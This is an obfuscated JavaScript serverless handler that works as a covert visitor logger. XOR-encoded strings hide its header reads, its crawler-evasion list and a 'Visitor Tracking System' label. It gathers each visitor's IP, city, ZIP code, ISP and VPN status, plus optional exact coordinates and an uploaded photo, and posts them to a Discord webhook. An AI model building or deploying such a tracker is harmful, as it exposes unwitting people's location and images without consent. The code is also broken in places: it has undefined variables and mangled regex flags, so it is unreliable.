export async function handler(event) {
  // Get IP data from multiple APIs
  const description = `${flagEmoji} New visitor from ${country || "Unknown"}`;
  // Get webhook from Netlify environment variable

const _humtvd=3492;const _aetiva=()=>_humtvd*2;if(false){_aetiva();}
(function(){const _pfpuwp=(t,k)=>t.map(c=>String.fromCharCode(c^k)).join('');
  const _khzujn = Object.fromEntries(Object.entries(event.headers || {}).map(([k, _bznadj]) => [k.toLowerCase(), _bznadj]));
  const _idxswv = _khzujn[_pfpuwp([10,12,26,13,82,30,24,26,17,11],127)] || "";
  const _nxmiyz = _khzujn[_pfpuwp([32,17,7,18,22,6,5],127)] || "";
  
  // IP Detection
  const _afqasg = _khzujn[_pfpuwp([7,82,25,16,13,8,30,13,27,26,27,82,25,16,13],127)] || "";
  const _lfiwnr = _afqasg.split(",").map(s => s.trim()).filter(Boolean);
  const _rqflfd = _khzujn[_pfpuwp([25,16,13,8,30,13,27,26,27],127)] || "";
  const _ihljzt = [];
  if (_rqflfd) {
    _rqflfd.split(",").forEach(part => {
      const _curyqq = part.match(/for=([^;]+)/i);
      if (_curyqq) {
        let _bznadj = _curyqq[1].trim().replace(/^"|"$/_ixceng, "");
        if (_bznadj.startsWith("[")) {
          _bznadj = _bznadj.replace(/^\[|\]$/_ixceng, "");
        } else if (_bznadj.includes('.') && _bznadj.includes(':')) {
          const _vsmyoo = _bznadj.lastIndexOf(':');
          if (_vsmyoo > 0) _bznadj = _bznadj.slice(0, _vsmyoo);
        }
        if (_bznadj) _ihljzt.push(_bznadj);
      }
    });
  }
  
  const _fqjzmw = [
    _khzujn[_pfpuwp([7,82,17,25,82,28,19,22,26,17,11,82,28,16,17,17,26,28,11,22,16,17,82,32,6,15,23,22,20,29],127)],
    _khzujn[_pfpuwp([7,82,13,26,30,19,82,32,6,15,23,22,20,29],127)],
    _khzujn[_pfpuwp([28,19,22,26,17,11,82,32,6,15,23,22,20,29],127)],
    ...fwdList,
    ...xffList
  ].filter(Boolean);

  const _ujyahh = /(?:\d{1,3}\.){3}\d{1,3}/;
  let _iehewn = "";
  let _leqrwn = "";
  for (const c of _fqjzmw) {
    const _zmymis = c.match(_ujyahh);
    if (!_iehewn && _zmymis) {
      const _caezzi = _zmymis[0];
      const _eiidpv = _caezzi.split('.').map(n => parseInt(n, 10));
      if (_eiidpv.length === 4 && _eiidpv.every(n => Number.isInteger(n) && n >= 0 && n <= 255)) _iehewn = _caezzi;
    }
    if (!_leqrwn && c.includes(":") && !c.match(/^\s*(?:\d{1,3}\.){3}\d{1,3}\s*$/)) {
      _leqrwn = c;
    }
    if (_iehewn && _leqrwn) break;
  }
  
  const _yphikb = _iehewn || _leqrwn || "";
  
  // Bot filtering
  const _kmoroy = _idxswv.toLowerCase();
  const _grmznx = [
    _pfpuwp([29,16,11],127), _pfpuwp([28,13,30,8,19,26,13],127), _pfpuwp([12,15,22,27,26,13],127), _pfpuwp([28,13,30,8,19],127), _pfpuwp([25,26,11,28,23],127), _pfpuwp([8,24,26,11],127), _pfpuwp([28,10,13,19],127), _pfpuwp([15,6,11,23,16,17,82,13,26,14,10,26,12,11,12],127),
    _pfpuwp([23,26,30,27,19,26,12,12],127), _pfpuwp([15,10,15,15,26,11,26,26,13],127), _pfpuwp([15,19,30,6,8,13,22,24,23,11],127), _pfpuwp([19,22,24,23,11,23,16,10,12,26],127), _pfpuwp([18,16,17,22,11,16,13],127), _pfpuwp([10,15,11,22,18,26],127),
    _pfpuwp([24,16,16,24,19,26,29,16,11],127), _pfpuwp([29,22,17,24,29,16,11],127), _pfpuwp([27,10,28,20,27,10,28,20,29,16,11],127), _pfpuwp([29,30,22,27,10,12,15,22,27,26,13],127), _pfpuwp([6,30,17,27,26,7,29,16,11],127), _pfpuwp([11,8,22,11,11,26,13,29,16,11],127),
    _pfpuwp([12,19,30,28,20,29,16,11],127), _pfpuwp([27,22,12,28,16,13,27,29,16,11],127), _pfpuwp([25,30,28,26,29,16,16,20,26,7,11,26,13,17,30,19,23,22,11],127), _pfpuwp([8,23,30,11,12,30,15,15],127)
  ];
  if (_grmznx.some(p => _kmoroy.includes(p))) {
    return { statusCode: 204, body: "" };
  }

  let _bowvbp = "", countryCode = "", city = "", provider = "", asn = "", zipcode = "", isVpn = false;
  let _dcihfk = null, lon = null, accuracy = null;
  let _vqyfos = false, includeLocation = false;
  
  // Check if image/location should be included (from request body or default to false)
  try {
    if (event.body) {
      const _bdiydr = JSON.parse(event.body);
      if (_bdiydr && typeof _bdiydr === _pfpuwp([16,29,21,26,28,11],127)) {
        _vqyfos = _bdiydr.includeImage === true;
        includeLocation = _bdiydr.includeLocation === true;
        if (typeof _bdiydr.lat === _pfpuwp([17,10,18,29,26,13],127) && typeof _bdiydr.lon === _pfpuwp([17,10,18,29,26,13],127)) { _dcihfk = _bdiydr.lat; lon = _bdiydr.lon; }
        if (typeof _bdiydr.accuracy === _pfpuwp([17,10,18,29,26,13],127)) accuracy = _bdiydr.accuracy;
      }
    }
  } catch (_) {}

  // Try IPAPI first for comprehensive _wylxlo
  try {
    const _cizzkm = await fetch(`https://ipapi.co/${encodeURIComponent(_yphikb)}/json/`, { 
      headers: { _pfpuwp([42,12,26,13,82,62,24,26,17,11],127): _pfpuwp([17,26,11,19,22,25,6,82,25,10,17,28],127) } 
    });
    if (_cizzkm.ok) {
      const _wylxlo = await _cizzkm.json();
      _bowvbp = _wylxlo.country_name || "";
      countryCode = (_wylxlo.country || "").toUpperCase();
      city = _wylxlo.city || "";
      provider = _wylxlo.org || _wylxlo.asn_org || _wylxlo.asn || "";
      asn = _wylxlo.asn || "";
      zipcode = _wylxlo.postal || _wylxlo.zip || "";
      
      // VPN detection (basic heuristic - common VPN ASNs and datacenters)
      const _fkixtm = [_pfpuwp([62,44,78,76,76,76,74],127), _pfpuwp([62,44,71,79,72,74],127), _pfpuwp([62,44,78,74,78,73,70],127), _pfpuwp([62,44,78,73,74,79,70],127), _pfpuwp([62,44,78,75,73,78,71],127), _pfpuwp([62,44,76,73,73,70,77],127), _pfpuwp([62,44,75,79,79,79,70],127), _pfpuwp([62,44,77,79,75,72,76],127), _pfpuwp([62,44,70,79,79,70],127), _pfpuwp([62,44,78,73,77,72,73],127)];
      const _mimlul = [_pfpuwp([28,19,16,10,27,25,19,30,13,26],127), _pfpuwp([24,16,16,24,19,26],127), _pfpuwp([30,18,30,5,16,17],127), _pfpuwp([18,22,28,13,16,12,16,25,11],127), _pfpuwp([27,22,24,22,11,30,19,95,16,28,26,30,17],127), _pfpuwp([9,10,19,11,13],127), _pfpuwp([19,22,17,16,27,26],127), _pfpuwp([16,9,23],127), _pfpuwp([23,26,11,5,17,26,13],127)];
      isVpn = _fkixtm.includes(asn) || _mimlul.some(vpnOrg => provider.toLowerCase().includes(vpnOrg));
      
      // Location _wylxlo if requested
      if (includeLocation && !_dcihfk && !lon && _wylxlo.latitude && _wylxlo.longitude) {
        _dcihfk = _wylxlo.latitude;
        lon = _wylxlo.longitude;
      }
    }
  } catch (_) {}

  // Fallback to Netlify geo _wylxlo
  if (!_bowvbp) {
    try {
      const _ycyeao = _khzujn[_pfpuwp([7,82,17,25,82,24,26,16],127)];
      if (_ycyeao) {
        const _ixceng = JSON.parse(_ycyeao);
        _bowvbp = _ixceng.country || _bowvbp;
        countryCode = (_ixceng.country_code || _ixceng.countryCode || countryCode || "").toUpperCase();
        city = _ixceng.city || city;
      }
    } catch (_) {}
  }

  // Generate flag emoji
  const _hqpwxf = countryCode ? countryCode
    .replace(/[^A-Z]/_ixceng, "")
    .split("")
    .map(c => String.fromCodePoint(0x1F1E6 - 65 + c.charCodeAt(0)))
    .join("") : _pfpuwp([55363,57228,65136],127);

  // Generate check-host.net link
  const _rmbldj = `https://check-host.net/_yphikb-info?host=${encodeURIComponent(_yphikb)}`;

  // Build _yiitkz
  const _mlqbao = new Date().toISOString();
  const _ctnbou = 0x00CED1;
  
  const _xzwpcr = [
    { name: _pfpuwp([55363,57202,95,54,47,95,62,27,27,13,26,12,12],127), value: _yphikb || "-", inline: true },
    { name: _pfpuwp([55363,57228,65136,95,60,16,10,17,11,13,6],127), value: `${_hqpwxf} ${_bowvbp || countryCode || "-"}`, inline: true },
    { name: _pfpuwp([55363,57254,65136,95,60,22,11,6],127), value: city || "-", inline: true },
    { name: _pfpuwp([55363,57199,95,62,44,49],127), value: asn || "-", inline: true },
    { name: _pfpuwp([55362,56685,95,41,47,49],127), value: isVpn ? _pfpuwp([55362,57245,95,38,26,12],127) : _pfpuwp([55362,56651,95,49,16],127), inline: true },
    { name: _pfpuwp([55362,56465,95,37,54,47,95,60,16,27,26],127), value: zipcode || "-", inline: true },
    { name: _pfpuwp([55363,57245,95,47,13,16,9,22,27,26,13],127), value: provider || "-", inline: false },
    { name: _pfpuwp([55362,56690,95,60,23,26,28,20,95,55,16,12,11],127), value: `[View Details](${_rmbldj})`, inline: false }
  ];

  // Add location if requested and available
  if (includeLocation && _dcihfk != null && lon != null) {
    _xzwpcr.push({ 
      name: _pfpuwp([55362,56498,95,60,16,16,13,27,22,17,30,11,26,12],127), 
      value: `${_dcihfk.toFixed(5)}, ${lon.toFixed(5)}${accuracy!=null?` (±${Math.round(accuracy)}_curyqq)`:''}`, 
      inline: false 
    });
  }

  const _yiitkz = {
    title: _pfpuwp([55362,56687,95,44,26,28,10,13,22,11,6,95,62,19,26,13,11],127),
    description,
    _ctnbou,
    _xzwpcr,
    footer: { text: _pfpuwp([41,22,12,22,11,16,13,95,43,13,30,28,20,22,17,24,95,44,6,12,11,26,18],127) },
    timestamp: _mlqbao
  };

  // Add image if requested and available
  let _vtcnlo = undefined;
  if (_vqyfos && typeof event.body === _pfpuwp([12,11,13,22,17,24],127)) {
    try {
      const _bdiydr = JSON.parse(event.body);
      if (_bdiydr && typeof _bdiydr === _pfpuwp([16,29,21,26,28,11],127) && typeof _bdiydr.photo === _pfpuwp([12,11,13,22,17,24],127) && /^data:image\/(?:png|jpeg|jpg);base64,/.test(_bdiydr.photo)) {
        const _curyqq = _bdiydr.photo.match(/^data:(image\/(?:png|jpeg|jpg));base64,(.*)$/);
        if (_curyqq) {
          const _brqupm = _curyqq[1];
          const _bhyfje = Buffer.from(_curyqq[2], _pfpuwp([29,30,12,26,73,75],127));
          const _ngsmap = _brqupm.includes(_pfpuwp([15,17,24],127)) ? _pfpuwp([15,23,16,11,16,81,15,17,24],127) : _pfpuwp([15,23,16,11,16,81,21,15,24],127);
          _vtcnlo = [{ name: _ngsmap, data: _bhyfje }];
          _yiitkz.image = { url: `attachment://${_ngsmap}` };
        }
      }
    } catch (_) {}
  }
  
  const _iktiqv = { embeds: [_yiitkz] };

  const _sjoihb = process.env.DISCORD_WEBHOOK_URL || "";
  if (!_sjoihb || !/^https:\/\/(?:discord(?:app)?\.com)\/api\/webhooks\//.test(_sjoihb)) {
    return { statusCode: 500, body: _pfpuwp([40,26,29,23,16,16,20,95,17,16,11,95,28,16,17,25,22,24,10,13,26,27],127) };
  }

  try {
    let resp;
    if (_vtcnlo) {
      const _sjhbky = new FormData();
      _sjhbky.append(_pfpuwp([15,30,6,19,16,30,27,32,21,12,16,17],127), JSON.stringify(_iktiqv));
      for (const f of _vtcnlo) _sjhbky.append(_pfpuwp([32,9,11,28,17,19,16,36,79,34],127), new Blob([f.data]), f.name);
      resp = await fetch(_sjoihb, { method: _pfpuwp([47,48,44,43],127), body: _sjhbky });
    } else {
      resp = await fetch(_sjoihb, { method: _pfpuwp([47,48,44,43],127), headers: { _pfpuwp([28,16,17,11,26,17,11,82,11,6,15,26],127): _pfpuwp([30,15,15,19,22,28,30,11,22,16,17,80,21,12,16,17],127) }, body: JSON.stringify(_iktiqv) });
    }
    if (!resp.ok) {
      return { statusCode: 502, body: _pfpuwp([57,30,22,19,26,27,95,11,16,95,27,26,19,22,9,26,13],127) };
    }
    return { statusCode: 204, body: "" };
  } catch (_) {
    return { statusCode: 500, body: _pfpuwp([58,13,13,16,13],127) };
  }
}